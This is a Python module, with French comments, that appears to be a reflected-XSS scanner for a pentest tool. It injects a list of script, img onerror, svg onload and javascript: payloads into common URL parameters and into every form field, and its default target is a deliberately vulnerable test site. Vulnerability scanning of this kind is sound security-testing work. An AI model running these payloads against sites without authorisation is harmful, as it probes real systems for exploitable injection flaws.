import json
import requests
from bs4 import BeautifulSoup

#########
## Utils functions
#########

def send_xss_payload(url, payload):
    """Send XSS payload via GET and test for reflected XSS."""
    results = []

    # Tester avec des paramètres GET courants
    for param in ["", "?q=", "?search=", "?id=", "/?x=", "/?test="]:  
        test_url = url + param + payload
        try:
            response = requests.get(test_url)
            if payload in response.text:
                results.append({
                    "url": test_url,
                    "method": "GET",
                    "payload": payload,
                    "vulnerable": True
                })
        except requests.RequestException as e:
            results.append({"error": str(e)})

    return results

def send_xss_form(url, payload):
    """Send XSS payload via form fields (POST and GET)."""
    results = []
    
    # Charger la page et analyser les formulaires
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        form_url = url + action if action else url
        data = {}

        # Remplir chaque champ du formulaire avec le payload
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            if input_name:
                data[input_name] = payload if input_type == 'text' else input_tag.get('value', '')

        # Envoyer la requête
        try:
            if method == 'post':
                form_response = requests.post(form_url, data=data)
            else:
                form_response = requests.get(form_url, params=data)

            # Vérifier si le payload est reflété
            if payload in form_response.text:
                results.append({
                    "url": form_url,
                    "method": method.upper(),
                    "payload": payload,
                    "vulnerable": True
                })
        except requests.RequestException as e:
            results.append({"error": str(e)})

    return results

#########
# Main functions
#########

def run_script(**args):
    if "urls" not in args:
        raise ValueError("Missing arguments: 'urls' is required")

    urls = args["urls"].split(",") if isinstance(args["urls"], str) else args["urls"]
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '<svg/onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\');">',
        '<input type="text" value="<script>alert(\'XSS\')</script>">',
    ]
    
    results = []
    for url in urls:
        for payload in xss_payloads:
            # Tester les paramètres GET
            results.extend(send_xss_payload(url, payload))
            # Tester les formulaires
            results.extend(send_xss_form(url, payload))
    
    # Filtrer les résultats pour ne retourner que ceux où une vulnérabilité est trouvée et éviter les doublons
    results = [res for res in results if res.get('vulnerable')]
    
    # Utilisation d'un set pour éviter les doublons basés sur l'URL et le payload
    unique_results = {f"{res['url']}_{res['payload']}": res for res in results}
    
    # Retourner une liste des résultats uniques
    return list(unique_results.values())

def display_result(result):
    print("Displaying results:")
    for res in result:
        print(f" XSS trouvé ! URL: {res['url']} | Méthode: {res.get('method', 'GET')} | Payload: {res['payload']}")

def format_to_table(res):
    return {
        "headers": ["URL", "Method", "Payload", "Vulnerable"],
        "rows": [[r.get("url", "N/A"), r.get("method", "GET"), r["payload"], r["vulnerable"]] for r in res]
    }

def gui_inputs():
    return [
        {"label": "URLs", "id": "urls", "type": "text"},
        {"label": "Export", "id": "export", "type": "checkbox"}
    ]

#########
# Test function
#########

def main():
    urls = ["http://testphp.vulnweb.com/"]  # Remplace par tes URLs de test
    res = run_script(urls=urls, export=True)
    display_result(res)

if __name__ == '__main__':
    main()
